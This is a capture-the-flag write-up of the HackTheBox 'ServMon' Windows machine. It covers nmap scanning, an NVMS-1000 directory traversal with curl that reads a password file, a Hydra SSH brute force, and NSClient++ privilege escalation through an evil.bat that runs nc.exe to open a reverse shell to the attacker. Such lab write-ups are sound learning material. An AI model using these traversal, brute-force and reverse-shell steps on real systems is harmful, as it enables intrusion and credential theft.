# ServMon
## Windows
### HackTheBox
### Easy

IP: 10.129.240.129

### NMAP
 * 21/tcp    open   ftp           syn-ack ttl 127 Microsoft ftpd
    ftp-syst:
      SYST: Windows_NT
    ftp-anon: Anonymous FTP login allowed (FTP code 230)
    01-18-20  12:05PM       <DIR>          Users
 * 22/tcp ssh OpenSSH for_Windows_7.7 (protocol 2.0)
 * 80/tcp http 
     http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
     http-methods:
       Supported Methods: GET HEAD POST OPTIONS
     fingerprint-strings:
       GetRequest, HTTPOptions, RTSPRequest:
         HTTP/1.1 200 OK
         Content-type: text/html
         Content-Length: 340
         Connection: close
         AuthInfo:
         <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
         <html xmlns="http://www.w3.org/1999/xhtml">
         <head>
         <title></title>
         <script type="text/javascript">
         window.location.href = "Pages/login.htm";
         </script>
         </head>
         <body>
         </body>
         </html>
       NULL:
         HTTP/1.1 408 Request Timeout
         Content-type: text/html
         Content-Length: 0
         Connection: close
         AuthInfo:
     http-title: Site doesn't have a title (text/html).
 * 135/tcp msrpc         Microsoft Windows RPC
 * 139/tcp netbios-ssn   Microsoft Windows netbios-ssn
 * 445/tcp microsoft-ds? 
 * 5040/tcp unknown      
 * 5666/tcp tcpwrapped   
 * 6063/tcp tcpwrapped   
 * 6699/tcp napster?     
 * 7680/tcp pando-pub    
 * 8443/tcp ssl/https-alt
    http-title: NSClient++
    Requested resource was /index.html
    ssl-cert: Subject: commonName=localhost
    Issuer: commonName=localhost
    Public Key type: rsa
    Public Key bits: 2048
    Signature Algorithm: sha1WithRSAEncryption
    Not valid before: 2020-01-14T13:24:20
    Not valid after:  2021-01-13T13:24:20
    MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
    SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
    http-methods:
      Supported Methods: GET
    ssl-date: TLS randomness does not represent time
    fingerprint-strings:
      FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
        HTTP/1.1 404
        Content-Length: 18
        Document not found
      GetRequest:
        HTTP/1.1 302
        Content-Length: 0
        Location: /index.html
 * 49664/tcp open   msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49665/tcp open   msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49666/tcp open   msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49667/tcp open   msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49668/tcp open   msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49669/tcp open   msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49670/tcp open   msrpc         syn-ack ttl 127 Microsoft Windows RPC

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
  smb2-time:
    date: 2021-10-20T23:15:40
    start_date: N/A
  clock-skew: 0s
  p2p-conficker:
    Checking for Conficker.C or higher...
    Check 1 (port 10806/tcp): CLEAN (Couldn't connect)
    Check 2 (port 62207/tcp): CLEAN (Couldn't connect)
    Check 3 (port 54608/udp): CLEAN (Failed to receive data)
    Check 4 (port 58111/udp): CLEAN (Timeout)
    0/4 checks are positive: Host is CLEAN or ports are blocked
  smb2-security-mode:
    3.1.1:
      Message signing enabled but not required


### FTP at Port 21 - Anonymous access
FTP Structure
```
 └── Users
     ├── Nadine
     │   └── Confidential.txt
     └── Nathan
         └── Notes to do.txt
```

**Confidential.txt**
> Nathan,
> 
> I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
> 
> Regards
> 
> Nadine

**Notes To Do.txt**
> 1) Change the password for NVMS - Complete
> 2) Lock down the NSClient Access - Complete
> 3) Upload the passwords
> 4) Remove public access to NVMS
> 5) Place the secret files in SharePoint

### Port 22 - OpenSSH for_Windows_7.7 (protocol 2.0)
No ready exploits available

### http://10.129.240.129:80
Forwards to http://10.129.240.129/Pages/login.htm
 * NVMS-1000 login
> Network Video Monitoring System (hereinafter referred to as “NVMS1000”) is a monitoring client 
> which is specially designed for network video surveillance. After the network video monitoring 
> system is well built, the super administrator can control the video input signal devices, such as 
> cameras, domes, etc., to achieve live monitor, video record and backup by configuring the video 
> parameters and viewing the live in the control panel. Users can
> choose the menu to control video surveillance system in the control panel. 
> The main functions of the control panel include live  view,  playback, E-map, device management, 
> group and scheme settings, user account and permission, local log, basic configuration and alarm 
> management.

From SearchSploit:
__hardware/webapps/47774.txt__
```
# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan T<C3><BC>rle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Testing file taversal:
```Console
$ curl http://10.129.240.129/../../../../../../../../../../../../windows/win.ini --path-as-is
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Try to use it to get the password file left on Nathan's desktop, per Nadine's note
```
╰─ curl http://10.129.240.129/../../../../../../../../../../../../users/Nathan/Desktop/Passwords.txt --path-as-is
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Bruteforce SSH with Hydra
```Console
$ hydra -L users.txt -P passwords.txt 10.129.240.129 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-20 19:40:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:2/p:7), ~1 try per task
[DATA] attacking ssh://10.129.240.129:22/
[22][ssh] host: 10.129.240.129   login: Nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-20 19:40:37
```
Retrieved credentials:
login: Nadine
password: L1k3B1gBut7s@W0rk

SSH into the machine.

```Console
nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```

Grabbed `user.txt`
Flag: cda-------~[takeAbreath]~------- 

### PrivEsc
Download winPEAS
Set up python server on attack machine
`nadine@SERVMON C:\Users\Nadine\Desktop>curl "http://10.129.240.129/winPEAS.bat" -o winPeas.bat`

WinPEAS shows NSClient++ is running. Checked searchsploit and found `windows/local/46802.txt`

> Exploit:
> 1. Grab web administrator password
> - open c:\program files\nsclient++\nsclient.ini
> or
> - run the following that is instructed when you select forget password
>         C:\Program Files\NSClient++>nscp web -- password --display
>         Current password: SoSecret
> 
> 2. Login and enable following modules including enable at startup and save configuration
> - CheckExternalScripts
> - Scheduler
> 
> 3. Download nc.exe and evil.bat to c:\temp from attacking machine
>         @echo off
>         c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
> 
> 4. Setup listener on attacking machine
>         nc -nlvvp 443
> 
> 5. Add script foobar to call evil.bat and save settings
> - Settings > External Scripts > Scripts
> - Add New
>         - foobar
>                 command = c:\temp\evil.bat
> 
> 6. Add schedulede to call script every 1 minute and save settings
> - Settings > Scheduler > Schedules
> - Add new
>         - foobar
>                 interval = 1m
>                 command = foobar
> 
> 7. Restart the computer and wait for the reverse shell on attacking machine
>         nc -nlvvp 443
>         listening on [any] 443 ...
>         connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
>         Microsoft Windows [Version 10.0.17134.753]
>         (c) 2018 Microsoft Corporation. All rights reserved.
> 
>         C:\Program Files\NSClient++>whoami
>         whoami
>         nt authority\system

```Console
PS C:\Users\Nadine> type "C:\Program Files\NSClient++\nsclient.ini" | findstr password
password = ew2x6SsGTxjRwXOT
PS C:\Users\Nadine> type "C:\Program Files\NSClient++\nsclient.ini" | findstr 127
allowed hosts = 127.0.0.1
```

NSClient++ is running on localhost. SSH Tunnel!
According to NMAP:
 * 8443/tcp ssl/https-alt
    http-title: NSClient++

Visit [https://127.0.0.1:8443](https://127.0.0.1:8443)
 * NSClient++ Dashboard
 * Log in with the password 'ew2x6SsGTxjRwXOT'

Uploaded `nc.exe` to the `\temp` directory using a python server and `cURL` to target
Tested it and the `.exe` is working fine. 
Using exploit json/webapps/48360.txt (saved in /exploits)

```Console
$ python3 privesc.py
usage: NSClient++ 0.5.2.35 Authenticated RCE [-h] [-t [target]] [-P [port]] [-p [password]] [-c [command]]

optional arguments:
  -h, --help     show this help message and exit
  -t [target]    Target IP Address.
  -P [port]      Target Port.
  -p [password]  NSClient++ Administrative Password.
  -c [command]   Command to execute on target
```

Use the SSH tunnel used earlier as the target

The python script didn't work. Tried another avenue by using the steps above.
1. Created an evil.bat file that executes `nc.exe`
2. Uploaded the `.bat` file and `nc.exe` to target machine using a Python server
3. Settings > External Scripts > Scripts > Add New
  3. foobar
  3. command = c:\temp\evil.bat 
4. Queries > Click Queries Link > command entered in step 3 should have the script from `evil.bat` listed
5. start a netcat listner on attack machine
6. Click on tab that says "Run" then confirm you want to run the script
7. You will get shell as `nt authority\system`
8. Get flag on the Administrator Desktop

Root flag: f6e-------~[takeAbreath]~-------
